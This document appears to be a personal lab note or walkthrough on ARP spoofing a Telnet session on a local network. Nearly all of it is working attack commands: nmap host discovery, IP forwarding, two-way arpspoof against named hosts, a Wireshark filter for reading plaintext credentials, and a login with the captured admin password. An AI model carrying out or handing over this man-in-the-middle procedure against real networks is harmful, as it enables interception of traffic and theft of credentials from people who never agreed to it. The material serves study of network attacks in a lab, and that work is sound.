**What & Why**

- ARP Spoofing = tell other machines "I am someone else"
- Traffic meant for them comes to you instead
- Telnet = unencrypted → credentials visible in plain text

**Attack Flow**

**1. Recon — find targets**

```bash
ifconfig        # find your IP (eth1)
nmap -sn 10.100.13.0/24   # find all hosts
# .36 = Telnet open
# .37 = target machine
# .140 = us (attacker)
```

**2. Enable IP forwarding (so traffic keeps flowing)**

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

**3. ARP Spoof — tell .36 that we are .37**

```bash
# install if needed
apt-get install arpspoof

# spoof both ways
arpspoof -i eth1 -t 10.100.13.36 10.100.13.37
arpspoof -i eth1 -t 10.100.13.37 10.100.13.36
```

**4. Capture traffic in Wireshark**

```
Interface: eth1
Filter: telnet
Follow TCP Stream → see credentials in plaintext
```

**5. Use captured credentials**

```bash
telnet 10.100.13.36
# login: admin
# password: mysecretpass
# → logged in ✓
```

---

**What happened:**

```
Normal:  .36 → .37 (Telnet traffic)
After ARP spoof: .36 → US → .37
We read everything in between
```
